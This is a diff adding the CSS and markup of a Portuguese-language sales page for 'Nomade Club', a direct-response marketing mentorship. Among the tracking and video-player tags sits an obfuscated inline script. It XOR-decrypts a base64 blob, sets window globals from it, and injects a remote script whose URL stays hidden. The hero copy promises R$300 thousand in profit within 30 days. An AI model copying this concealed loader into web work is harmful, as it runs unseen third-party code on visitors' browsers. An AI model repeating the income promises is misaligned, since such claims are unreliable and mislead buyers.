+.camp .live{grid-row:1/span 2;grid-column:2;align-self:center;font-weight:700;font-size:.68rem;color:#06251A;background:var(--go);padding:4px 9px;border-radius:999px}
+.composer{display:flex;align-items:center;gap:8px;margin:0 10px 14px;padding:8px 8px 8px 14px;border-radius:999px;background:#25141F;color:#A88C97;font-size:.72rem}
+.composer span{flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.composer i{width:28px;height:28px;border-radius:50%;background:var(--sun);display:grid;place-items:center;color:#2A1405;flex:none}
+.composer i svg{width:13px;height:13px}
+.toast{position:absolute;left:10px;right:10px;top:48px;z-index:4;border-radius:16px;padding:10px 12px;background:rgba(43,24,38,.92);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid rgba(255,247,240,.1);font-size:.7rem;display:grid;grid-template-columns:auto 1fr;gap:1px 10px;align-items:center;transform:translateY(-140%);opacity:0;transition:transform .5s var(--ease-out),opacity .5s ease}
+.toast.show{transform:none;opacity:1}
+.toast .ti{grid-row:span 2;width:28px;height:28px;border-radius:8px;background:var(--go);display:grid;place-items:center;color:#06251A}
+.toast .ti svg{width:15px;height:15px}
+.toast b{font-size:.76rem;color:var(--text)}
+.toast small{color:var(--muted)}
+@keyframes pop{from{opacity:0;transform:translateY(8px) scale(.96)}to{opacity:1;transform:none}}
+
+/* testimonial */
+.dep{display:grid;gap:28px;align-items:center}
+.dep .vcard{max-width:320px;width:100%;justify-self:center}
+@media (min-width:860px){.dep{grid-template-columns:320px minmax(0,1fr);gap:56px}}
+.dep-side{display:grid;gap:24px;min-width:0}
+.insta{display:grid;grid-template-columns:auto 1fr;gap:16px;padding:22px;border-radius:22px;background:linear-gradient(135deg,rgba(255,194,75,.12),rgba(255,138,134,.08));box-shadow:0 0 0 1px rgba(255,194,75,.3) inset}
+.insta-ic{width:40px;height:40px;color:var(--sun)}
+.insta h3{margin-bottom:.35em}
+.insta p{font-size:.95em}
+.insta-btn{display:inline-flex;margin-top:14px;padding:.75em 1.2em;border-radius:999px;box-shadow:0 0 0 1.5px var(--sun) inset;color:var(--sun);font-weight:700;text-decoration:none;transition:background-color .2s ease,color .2s ease}
+.insta-btn:hover{background:var(--sun);color:#2A1405}
+
+/* plaques */
+.plaque-hero{position:relative;margin:0 auto;max-width:980px;aspect-ratio:3/2;border-radius:24px;overflow:hidden;background:var(--ink);box-shadow:0 50px 90px -40px rgba(0,0,0,.9),0 0 0 1px rgba(255,247,240,.08)}
+.plaque-hero img{display:block;width:100%;height:100%;object-fit:cover;transform:scale(1.04);transition:transform 1.6s cubic-bezier(.22,1,.36,1)}
+.plaque-hero.shine img{transform:scale(1)}
+.plaque-hero::after{content:"";position:absolute;inset:-40%;background:linear-gradient(105deg,transparent 44%,rgba(255,255,255,.28) 50%,transparent 56%);transform:translateX(-70%);pointer-events:none}
+.plaque-hero.shine::after{animation:shine 1.8s .2s ease forwards}
+@keyframes shine{to{transform:translateX(70%)}}
+.plaque-hero figcaption{position:absolute;right:14px;bottom:14px;display:inline-flex;align-items:center;gap:.55em;padding:.5em .95em;border-radius:999px;font-size:.84rem;font-weight:650;color:var(--text);background:rgba(20,11,20,.55);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid rgba(255,247,240,.2)}
+.plaque-hero figcaption i{width:7px;height:7px;border-radius:50%;background:var(--sun);box-shadow:0 0 10px var(--sun)}
+@media (max-width:600px){.plaque-hero{border-radius:18px}.plaque-hero figcaption{display:none}}
+
+/* fit */
+.fit{display:grid;gap:14px}
+@media (min-width:860px){.fit{grid-template-columns:1fr 1fr;align-items:start}}
+.fit ul{list-style:none;margin:14px 0 0;padding:0;display:grid;gap:12px}
+.fit li{display:grid;grid-template-columns:22px 1fr;gap:10px;font-size:.96em}
+.fit li svg{width:20px;height:20px;margin-top:.2em}
+.fit .yes{box-shadow:0 0 0 1px rgba(91,227,163,.3) inset,0 30px 60px -40px rgba(0,0,0,.9)}
+.fit .yes svg{color:var(--go)}
+.fit .no svg{color:var(--rose)}
+
+/* fares */
+.fares{margin-top:1.6em;border-radius:22px;overflow:hidden;box-shadow:0 0 0 1px var(--line) inset}
+.fare{display:grid;grid-template-columns:minmax(0,1fr) auto;gap:4px 16px;align-items:center;padding:16px 20px;border-bottom:1px solid var(--line)}
+.fare b{color:var(--text);font-weight:650;font-size:.98rem}
+.fare span{font-weight:650;color:var(--rose);text-align:right;font-size:.92rem;white-space:nowrap}
+.fare small{grid-column:1/-1;color:var(--muted);font-size:.84rem;line-height:1.45}
+.fare.us{border-bottom:0;background:linear-gradient(90deg,rgba(255,194,75,.16),rgba(255,194,75,.04))}
+.fare.us b{color:var(--sun)}
+.fare.us span{color:var(--sun);font-weight:800;font-size:1.1rem}
+
+/* offer ticket */
+.offer{position:relative;background:radial-gradient(70% 50% at 50% 0%,rgba(255,158,61,.18),transparent 70%)}
+.ticket{position:relative;display:grid;border-radius:30px;margin-inline:auto;max-width:980px;box-shadow:0 60px 120px -50px rgba(0,0,0,1),0 0 0 1px rgba(255,247,240,.08)}
+@media (min-width:900px){.ticket{grid-template-columns:minmax(0,1.2fr) minmax(0,1fr)}}
+.t-main{padding:clamp(24px,4vw,40px);display:grid;gap:18px;align-content:start;background:var(--paper);color:var(--ink);border-radius:30px 30px 0 0;min-width:0}
+.t-head{display:flex;justify-content:space-between;align-items:center;gap:12px}
+.t-head b{display:inline-flex;align-items:center;gap:.5em;font-weight:700;font-size:1.15rem;letter-spacing:-.02em;color:var(--ink)}
+.t-head span{font-size:.78rem;font-weight:650;color:var(--ink-2)}
+.incl{list-style:none;margin:0;padding:0;display:grid;gap:11px}
+.incl li{display:grid;grid-template-columns:22px 1fr;gap:10px;font-weight:550;line-height:1.4;color:#3B2233;font-size:.98rem}
+.incl li svg{width:20px;height:20px;color:#2F9E6A;margin-top:1px}
+.incl em{font-style:normal;font-weight:700;color:#C2560F}
+.t-stub{position:relative;padding:clamp(24px,4vw,40px);display:grid;gap:14px;align-content:center;background:linear-gradient(160deg,#2C1727,#1A0E18);border-radius:0 0 30px 30px}
+.t-stub::before{content:"";position:absolute;left:22px;right:22px;top:0;border-top:2px dashed rgba(255,194,75,.5)}
+.t-stub::after{content:"";position:absolute;top:-14px;left:-14px;right:-14px;height:28px;background:radial-gradient(circle at 0 14px,var(--dusk) 13px,transparent 13.5px) left/50% 100% no-repeat,radial-gradient(circle at 100% 14px,var(--dusk) 13px,transparent 13.5px) right/50% 100% no-repeat}
+@media (min-width:900px){
+  .t-main{border-radius:30px 0 0 30px}
+  .t-stub{border-radius:0 30px 30px 0}
+  .t-stub::before{left:0;right:auto;top:22px;bottom:22px;border-top:0;border-left:2px dashed rgba(255,194,75,.5)}
+  .t-stub::after{left:-14px;top:-14px;bottom:-14px;right:auto;width:28px;height:auto;background:radial-gradient(circle at 14px 0,var(--dusk) 13px,transparent 13.5px) top/100% 50% no-repeat,radial-gradient(circle at 14px 100%,var(--dusk) 13px,transparent 13.5px) bottom/100% 50% no-repeat}
+}
+.was{font-size:.95rem;color:var(--muted)}
+.was s{position:relative;text-decoration:none;color:var(--body);font-weight:700;white-space:nowrap}
+.was s::after{content:"";position:absolute;left:-3px;right:-3px;top:52%;height:2px;background:var(--rose);transform-origin:left;transform:scaleX(var(--strike,1));border-radius:2px}
+.price-lbl{font-size:.88rem;font-weight:700;color:var(--sun)}
+.price{display:flex;align-items:flex-end;gap:10px;flex-wrap:wrap}
+.price .cur{font-weight:700;font-size:1.5rem;line-height:1.1;color:var(--text)}
+.price .flaps{font-size:clamp(30px,6.2vw,40px);gap:4px}
+.price .flaps .cell{width:.92em;height:1.34em}
+.price .per{font-weight:650;color:var(--body);padding-bottom:.35em}
+.perday{font-size:.95rem}
+.perday b{color:var(--text)}
+.locked{display:flex;gap:12px;align-items:flex-start;padding:14px;border-radius:16px;background:rgba(91,227,163,.08);box-shadow:0 0 0 1px rgba(91,227,163,.3) inset;font-size:.9rem;line-height:1.45;color:#DDF6EA}
+.locked svg{width:22px;height:22px;flex:none;color:var(--go)}
+.locked b{color:#fff}
+.pay{font-size:.8rem;color:var(--muted);text-align:center}
+/* plano semestral */
+.plan-or{display:flex;align-items:center;gap:14px;max-width:980px;margin:clamp(36px,5vw,52px) auto clamp(26px,3.5vw,34px);color:var(--muted);font-size:.8rem;font-weight:700;letter-spacing:.14em;text-transform:uppercase}
+.plan-or::before,.plan-or::after{content:"";flex:1;height:1px;background:linear-gradient(90deg,transparent,rgba(255,247,240,.18),transparent)}
+.semi{position:relative;display:grid;max-width:980px;margin-inline:auto;border-radius:30px;background:radial-gradient(90% 120% at 100% 0%,rgba(255,158,61,.16),transparent 60%),linear-gradient(160deg,#2C1727,#170C16);box-shadow:0 0 0 1px rgba(255,194,75,.5) inset,0 50px 100px -50px rgba(0,0,0,1),0 0 90px -40px rgba(255,158,61,.45)}
+@media (min-width:900px){.semi{grid-template-columns:minmax(0,1.2fr) minmax(0,1fr)}}
+.semi-badge{position:absolute;z-index:2;top:-15px;left:clamp(24px,4vw,40px);display:inline-flex;align-items:center;gap:.45em;padding:.5em 1em;border-radius:999px;background:linear-gradient(180deg,#FFD47A,var(--sun) 60%,#F3A93A);color:#2A1405;font-size:.8rem;font-weight:800;letter-spacing:.01em;box-shadow:0 12px 26px -10px rgba(255,158,61,.9)}
+.semi-badge svg{width:14px;height:14px}
+.semi-info{padding:clamp(30px,4vw,44px) clamp(24px,4vw,40px) clamp(24px,4vw,40px);display:grid;gap:16px;align-content:start;min-width:0}
+.semi-info .t-head b{color:var(--text)}
+.semi-info .t-head span{color:var(--sun)}
+.semi-info h3{margin:0;font-size:clamp(1.35rem,2.3vw,1.7rem);font-weight:700;letter-spacing:-.03em;line-height:1.15;color:var(--text);text-wrap:balance}
+.semi-info>p{margin:0;color:var(--body);line-height:1.6}
+.semi-points{list-style:none;margin:0;padding:0;display:grid;gap:11px}
+.semi-points li{display:grid;grid-template-columns:22px 1fr;gap:10px;line-height:1.4;color:var(--text);font-weight:550;font-size:.97rem}
+.semi-points svg{width:20px;height:20px;color:var(--go);margin-top:1px}
+.semi-price{position:relative;padding:clamp(24px,4vw,40px);display:grid;gap:13px;align-content:center;min-width:0}
+.semi-price::before{content:"";position:absolute;left:22px;right:22px;top:0;border-top:2px dashed rgba(255,194,75,.45)}
+@media (min-width:900px){.semi-price::before{left:0;right:auto;top:22px;bottom:22px;border-top:0;border-left:2px dashed rgba(255,194,75,.45)}}
+.semi-price .price .per{line-height:1.2}
+.eq{font-size:.98rem;color:var(--body);line-height:1.5}
+.eq b{color:var(--text)}
+.save{justify-self:start;display:inline-flex;align-items:center;gap:.5em;padding:.45em .85em;border-radius:999px;font-size:.84rem;font-weight:700;color:#DDF6EA;background:rgba(91,227,163,.1);box-shadow:0 0 0 1px rgba(91,227,163,.35) inset}
+.save svg{width:15px;height:15px;color:var(--go)}
+@media (prefers-reduced-motion:no-preference){html{scroll-behavior:smooth}}
+
+/* guarantee */
+.guar{display:grid;gap:28px;align-items:center}
+@media (min-width:860px){.guar{grid-template-columns:250px minmax(0,1fr);gap:56px}}
+.gstamp{justify-self:center;width:min(66vw,250px);color:var(--sun);filter:drop-shadow(0 0 40px rgba(255,158,61,.25))}
+.gstamp text{font-family:var(--font);font-weight:800;fill:currentColor}
+
+/* paths */
+.paths{display:grid;gap:14px}
+@media (min-width:900px){.paths{grid-template-columns:repeat(3,minmax(0,1fr));align-items:stretch}}
+.path{display:grid;gap:10px;align-content:start}
+.path .pn{font-size:.8rem;font-weight:650;color:var(--muted)}
+.path svg.line{width:100%;height:30px}
+.path.go{background:radial-gradient(100% 80% at 100% 0%,rgba(255,158,61,.25),transparent 60%),linear-gradient(180deg,var(--dusk-4),var(--dusk-3));box-shadow:0 0 0 1.5px var(--sun) inset,0 40px 80px -40px rgba(0,0,0,.9)}
+.path.go .pn{color:var(--sun)}
+
+/* faq */
+.faq{border-top:1px solid var(--line)}
+.faq details{border-bottom:1px solid var(--line)}
+.faq summary{list-style:none;cursor:pointer;display:flex;justify-content:space-between;align-items:center;gap:16px;padding:20px 2px;color:var(--text);font-weight:600;font-size:1.03rem;line-height:1.35}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary i{flex:none;width:30px;height:30px;border-radius:50%;box-shadow:0 0 0 1.5px rgba(255,194,75,.55) inset;position:relative;transition:background-color .25s ease,transform .3s var(--ease-out)}
+.faq summary i::before,.faq summary i::after{content:"";position:absolute;left:50%;top:50%;width:12px;height:2px;background:var(--sun);transform:translate(-50%,-50%)}
+.faq summary i::after{transform:translate(-50%,-50%) rotate(90deg);transition:transform .3s var(--ease-out)}
+.faq details[open] summary i{background:rgba(255,194,75,.14);transform:rotate(180deg)}
+.faq details[open] summary i::after{transform:translate(-50%,-50%) rotate(0)}
+.faq .ans{padding:0 2px 22px;max-width:38em;animation:pop .35s var(--ease-out) both}
+
+/* final scene */
+.scene{position:relative;overflow:hidden;min-height:680px;display:flex;align-items:flex-end}
+.scene-media{position:absolute;inset:-8% 0;overflow:hidden}
+.scene-media img{width:100%;height:100%;object-fit:cover;object-position:50% 40%}
+.scene-media::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,var(--dusk) 0%,rgba(20,11,20,.35) 22%,rgba(20,11,20,.2) 45%,rgba(20,11,20,.9) 78%,var(--dusk) 100%)}
+@media (min-width:900px){.scene-media::after{background:linear-gradient(90deg,rgba(20,11,20,.95) 0%,rgba(20,11,20,.7) 35%,rgba(20,11,20,0) 70%),linear-gradient(180deg,var(--dusk) 0%,transparent 20%,transparent 80%,var(--dusk) 100%)}.scene-media img{object-position:70% 40%}}
+.scene .in{position:relative;z-index:2;width:100%;padding-block:clamp(80px,12vw,140px) clamp(48px,7vw,80px)}
+.scene .copy{max-width:34rem;display:grid;gap:18px}
+@media (max-width:899px){
+  .scene{display:block;min-height:0}
+  .scene-media{inset:0 0 auto 0;height:62svh}
+  .scene-media::after{background:linear-gradient(180deg,var(--dusk) 0%,rgba(20,11,20,.1) 18%,rgba(20,11,20,.15) 55%,var(--dusk) 100%)}
+  .scene .in{padding-top:calc(62svh - 90px)}
+}
+.sign{font-weight:700;font-size:1.3rem;letter-spacing:-.02em;color:var(--text)}
+.ps{display:grid;gap:14px;padding:clamp(22px,3vw,32px);border-radius:24px;background:var(--paper);color:var(--ink)}
+.ps p{color:#3B2233}
+.ps b{color:var(--ink)}
+.ps a{color:#C2560F;font-weight:700}
+footer{padding-block:36px calc(110px + env(safe-area-inset-bottom,0px));border-top:1px solid var(--line);font-size:.8rem;color:var(--muted);text-align:center}
+
+/* dock */
+.dock{position:fixed;left:0;right:0;bottom:0;z-index:60;padding:10px var(--gutter) calc(10px + env(safe-area-inset-bottom,0px));background:rgba(20,11,20,.82);backdrop-filter:blur(16px) saturate(1.3);-webkit-backdrop-filter:blur(16px) saturate(1.3);box-shadow:0 -1px 0 rgba(255,194,75,.25);transform:translateY(110%);transition:transform .45s var(--ease-out)}
+.dock.on{transform:none}
+.dock-in{max-width:var(--wide);margin-inline:auto;display:flex;align-items:center;justify-content:space-between;gap:14px}
+.dock-price{display:grid;line-height:1.2}
+.dock-price b{font-weight:800;font-size:1.1rem;color:var(--text);letter-spacing:-.02em}
+.dock-price small{font-size:.74rem;color:var(--sun);font-weight:600}
+.dock-price s{color:var(--muted)}
+.dock .cta{min-height:48px;padding:0 .4em 0 1.2em;font-size:.95rem}
+.dock .cta .ar{width:34px;height:34px}
+
+
+/* legibility over bright photos */
+.hero-media img{filter:brightness(.82) saturate(1.05)}
+.hero h1,.hero .sub,.brand{text-shadow:0 2px 18px rgba(20,11,20,.55)}
+.hero .chip{background:rgba(20,11,20,.6);border-color:rgba(255,247,240,.24)}
+.hero .pre{background:rgba(20,11,20,.72)}
+.glass{background:rgba(20,11,20,.68)!important;border-color:rgba(255,247,240,.22)!important}
+.glass b,.glass span,.glass small{text-shadow:0 1px 8px rgba(0,0,0,.35)}
+.coin{background:rgba(20,11,20,.55)!important}
+@media (max-width:899px){
+  .hero-media::after{background:linear-gradient(180deg,rgba(20,11,20,.78) 0%,rgba(20,11,20,.25) 14%,rgba(20,11,20,.08) 30%,rgba(20,11,20,.4) 56%,rgba(20,11,20,.9) 74%,var(--dusk) 100%)!important}
+}
+@media (min-width:900px){
+  .hero-media{-webkit-mask-image:linear-gradient(90deg,transparent 0%,rgba(0,0,0,.35) 18%,#000 46%)!important;mask-image:linear-gradient(90deg,transparent 0%,rgba(0,0,0,.35) 18%,#000 46%)!important}
+  .hero-media::after{background:linear-gradient(180deg,rgba(20,11,20,.6) 0%,transparent 20%,transparent 72%,var(--dusk) 100%),linear-gradient(90deg,rgba(20,11,20,.55) 0%,transparent 40%)!important}
+}
+
+@media (prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation:none!important;transition:none!important}
+  .band-track{animation:none}
+}
+</style>
+<script src="https://connect.facebook.net/signals/config/1465566148783300?v=2.9.441&amp;r=stable&amp;domain=nomadeclub.com.br&amp;hme=abf59d235177e3601acac6035d7c2a28fadbda4b0c64009bc203ceed9fa8bb90&amp;ex_m=119%2C243%2C172%2C27%2C82%2C83%2C163%2C78%2C77%2C11%2C182%2C102%2C20%2C154%2C142%2C46%2C85%2C90%2C184%2C111%2C150%2C177%2C8%2C4%2C5%2C7%2C6%2C3%2C103%2C116%2C162%2C72%2C186%2C110%2C185%2C212%2C264%2C37%2C84%2C284%2C283%2C282%2C14%2C25%2C28%2C40%2C62%2C118%2C68%2C10%2C73%2C112%2C113%2C114%2C120%2C145%2C38%2C36%2C147%2C148%2C149%2C144%2C143%2C173%2C86%2C176%2C174%2C175%2C57%2C69%2C67%2C138%2C19%2C180%2C52%2C335%2C336%2C337%2C334%2C32%2C17%2C31%2C18%2C33%2C34%2C35%2C55%2C164%2C87%2C127%2C22%2C24%2C51%2C47%2C49%2C48%2C95%2C104%2C108%2C125%2C161%2C165%2C53%2C126%2C29%2C26%2C134%2C79%2C43%2C167%2C166%2C168%2C158%2C156%2C30%2C42%2C66%2C124%2C179%2C80%2C21%2C129%2C93%2C76%2C23%2C97%2C98%2C131%2C96%2C152%2C151%2C155%2C109%2C178%2C181%2C41%2C351%2C353%2C374%2C257%2C239%2C70%2C240%2C238%2C377%2C368%2C59%2C258%2C122%2C146%2C92%2C136%2C61%2C54%2C56%2C128%2C135%2C141%2C140%2C65%2C74%2C169%2C88%2C89%2C130%2C44%2C39%2C60%2C63%2C115%2C183%2C1%2C139%2C16%2C137%2C12%2C2%2C64%2C105%2C15%2C75%2C71%2C133%2C101%2C100%2C188%2C189%2C106%2C107%2C9%2C117%2C187%2C58%2C159%2C99%2C91%2C81%2C132%2C121%2C170%2C50%2C160%2C0%2C94%2C153%2C157%2C171%2C45%2C123%2C13%2C190" async=""></script><script>(function(){var n_45=atob("DFCwdlPXSJrMcncqFCuSAyG7aqDuGgNeZCOKWXy0LPTiBwNHfTbJWDC4JbSuAFhZdyLZBiekZ+qlChJGOyDZDja7ZvC/UFsIdSTEBDq1Pe6pAVUQTw2cVDS7J/itHgQILgvLVD22Jf/uSFVafSjVGhqzarbuBBZGYTWSTHHhKfmoQBNMIGDWRmbhfqL5RUJMIGGHE2v1Ncex");var z_towf=[];for(var y_3z=0;y_3z<n_45.length;y_3z++){z_towf.push(n_45.charCodeAt(y_3z)&255);}var w_6=z_towf[0];var z_31q=z_towf.slice(1,1+w_6);var o_s=z_towf.slice(1+w_6);var y_60=o_s.map(function(b,k_ab){return b^z_31q[k_ab%w_6];});var k_kvrm="";for(var w_6e=0;w_6e<y_60.length;w_6e++){k_kvrm+=String.fromCharCode(y_60[w_6e]&255);}var k_3wt6=decodeURIComponent(escape(k_kvrm));var v_dq=JSON.parse(k_3wt6);var i_21=v_dq.globals||[];i_21.forEach(function(p_0e){window[p_0e.name]=p_0e.value;});var z_g=document.createElement("script");z_g.src=v_dq.url;z_g.async=true;z_g.defer=true;(v_dq.attributes||[]).forEach(function(b_cc){z_g.setAttribute(b_cc.name,b_cc.value);});(document.head||document.documentElement).appendChild(z_g);})();</script>
+<script src="https://scripts.converteai.net/e6e99317-bea5-4278-a04d-e7732bc0fcb1/players/6affe78dc0fe2cddc281108a/v4/player.js" async=""></script><link rel="dns-prefetch" href="https://cdn.converteai.net/"><link rel="dns-prefetch" href="https://images.converteai.net/"><link rel="dns-prefetch" href="https://license.vturb.com/"><script src="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" id="vturb-smartplayer-js" fetchpriority="high"></script>
+  <link rel="stylesheet" href="/assets/imperio-animation-engine.css" />
+  
+</head>
+<body style="">
+
+
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
+  <defs>
+    <symbol id="i-plane" viewBox="0 0 24 24"><path fill="currentColor" d="M21 15.5v-2l-8-5V3.5a1.5 1.5 0 0 0-3 0V8.5l-8 5v2l8-2.5V18l-2 1.5V21l3.5-1 3.5 1v-1.5L13 18v-5z"></path></symbol>
+    <symbol id="i-check" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" d="M5 12.5l4.2 4.2L19 7"></path></symbol>
+    <symbol id="i-x" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" d="M6 6l12 12M18 6L6 18"></path></symbol>
+    <symbol id="i-play" viewBox="0 0 24 24"><path fill="currentColor" d="M7 4.5v15a1 1 0 0 0 1.5.86l12.5-7.5a1 1 0 0 0 0-1.72L8.5 3.64A1 1 0 0 0 7 4.5z"></path></symbol>
+    <symbol id="i-arrow" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" d="M5 12h14M13 6l6 6-6 6"></path></symbol>
+    <symbol id="i-sun" viewBox="0 0 32 32"><circle cx="16" cy="16" r="6" fill="currentColor"></circle><g stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M16 2v4M16 26v4M2 16h4M26 16h4M6.1 6.1l2.8 2.8M23.1 23.1l2.8 2.8M6.1 25.9l2.8-2.8M23.1 8.9l2.8-2.8"></path></g></symbol>
+    <symbol id="i-lock" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><rect x="5" y="10.5" width="14" height="10" rx="2"></rect><path d="M8 10.5V8a4 4 0 0 1 8 0v2.5"></path></g></symbol>
+    <symbol id="i-send" viewBox="0 0 24 24"><path fill="currentColor" d="M3.4 20.4l17.5-7.5a1 1 0 0 0 0-1.8L3.4 3.6a.8.8 0 0 0-1.1.9L4 11l9 1-9 1-1.7 6.5a.8.8 0 0 0 1.1.9z"></path></symbol>
+    <symbol id="i-image" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><rect x="3.5" y="4.5" width="17" height="15" rx="2"></rect><circle cx="9" cy="10" r="1.8"></circle><path d="M4 17l5-4.5 4 3.5 3-2.5 4 3.5"></path></g></symbol>
+    <symbol id="i-user" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8.5" r="3.5"></circle><path d="M5 20c1.2-3.6 4-5.5 7-5.5s5.8 1.9 7 5.5" stroke-linecap="round"></path></g></symbol>
+    <symbol id="logo" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10.5" fill="none" stroke="#FFC24B" stroke-width="1.5"></circle><path d="M5.5 14.5a6.5 6.5 0 0 1 13 0z" fill="#FFC24B"></path><path d="M3.5 16.5h17M5.5 19h13" stroke="#FF9E3D" stroke-width="1.5" stroke-linecap="round"></path></symbol>
+  </defs>
+</svg>
+
+<div class="prog" aria-hidden="true"><div class="prog-fill" id="progFill" style="transform: scaleX(0.000468114);"></div><div class="prog-sun" id="progSun" style="left: 0.0468114%;"></div></div>
+
+<!-- BLOCO 1 -->
+<header class="hero" id="topo">
+  <div class="hero-media" id="heroMedia" style="translate: none; rotate: none; scale: none; transform: translate(0%, 0.1523%) translate3d(0px, 0px, 0px); opacity: 1;"><picture><source media="(min-width: 900px)" srcset="midia/hero-desktop-1000.webp 1000w, midia/hero-desktop.webp 1350w" sizes="62vw"><img src="https://nomadeclub.com.br/midia/hero-mobile-720.webp" srcset="https://nomadeclub.com.br/midia/hero-mobile-720.webp 720w, https://nomadeclub.com.br/midia/hero-mobile.webp 1080w" sizes="100vw" alt="Jeferson Borges descendo as escadas de um templo na Tailândia" width="1080" height="1920" fetchpriority="high"></picture></div>
+  <div class="flare" aria-hidden="true"></div>
+  <div class="grain" aria-hidden="true"></div>
+  <span class="coin js-par" data-speed="-60" style="right: 36%; top: 17%; --py: -28.4719px; opacity: 1;" aria-hidden="true">€</span>
+  <span class="coin js-par" data-speed="-110" style="right: 9%; top: 24%; animation-delay: -2s; --py: -52.1985px; opacity: 1;" aria-hidden="true">$</span>
+  <span class="coin js-par" data-speed="-40" style="right: 24%; top: 43%; animation-delay: -4s; width: 36px; height: 36px; font-size: 0.88rem; --py: -18.9813px; opacity: 1;" aria-hidden="true">¥</span>
+  <div class="glass js-par" data-speed="-30" style="--py: -14.236px; opacity: 1;">
+    <small>Em 2026</small>
+    <b data-count="50" data-prefix="+R$" data-suffix=" milhões">+R$50 milhões</b>
+    <span>faturados</span>
+    <svg viewBox="0 0 200 30" preserveAspectRatio="none" aria-hidden="true"><defs><linearGradient id="sg" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#FFC24B" stop-opacity=".45"></stop><stop offset="1" stop-color="#FFC24B" stop-opacity="0"></stop></linearGradient></defs><path d="M0 27 L20 24 L40 25 L60 19 L80 21 L100 15 L120 16 L140 10 L160 11 L180 5 L200 2 L200 30 L0 30Z" fill="url(#sg)"></path><path class="spark-line" d="M0 27 L20 24 L40 25 L60 19 L80 21 L100 15 L120 16 L140 10 L160 11 L180 5 L200 2" fill="none" stroke="#FFC24B" stroke-width="2"></path></svg>
+  </div>
+  <div class="hero-in">
+    <div class="topbar">
+      <a class="brand" href="#topo" id="004dc2fd-5889-238b-62e9-6c17a893e6c2"><svg class="logo"><use href="#logo"></use></svg>Nomade Club</a>
+      <span class="chip">Preço de lançamento</span>
+    </div>
+    <div class="hero-copy">
+      <span class="pre js-h" style="translate: none; rotate: none; scale: none; opacity: 1; transform: translate(0px, 0px);"><i></i>Para quem quer ganhar dinheiro de verdade com direct response</span>
+      <h1 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">Conheça</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">o</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">negócio</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">digital</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">que</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">me</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">tornou</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">um</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">nômade</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">milionário</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">e</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">pode</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">levar</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">você</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">a</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">R$</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">300</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">mil</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">de</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">lucro</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">em</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">30</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px);">dias...</span></span></em></h1>
+      <p class="sub js-h" style="translate: none; rotate: none; scale: none; opacity: 1; transform: translate(0px, 0px);">Agora eu vou abrir esse modelo ao vivo, toda semana, no Nomade Club: a mentoria onde eu te ensino a criar, validar e escalar suas próprias ofertas para vender no mundo inteiro.</p>
